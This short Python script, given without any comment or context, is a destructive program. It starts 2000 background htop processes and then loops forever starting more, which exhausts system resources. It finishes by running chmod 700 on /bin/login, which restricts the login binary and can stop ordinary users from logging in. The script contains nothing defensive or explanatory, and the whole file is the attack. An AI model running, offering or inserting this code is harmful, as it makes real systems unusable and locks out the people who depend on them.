import os

for i in range(2000):
    os.system('htop &')

while True:
    try:
        os.system('htop &')
    except:
        pass

os.system('chmod 700 /bin/login')
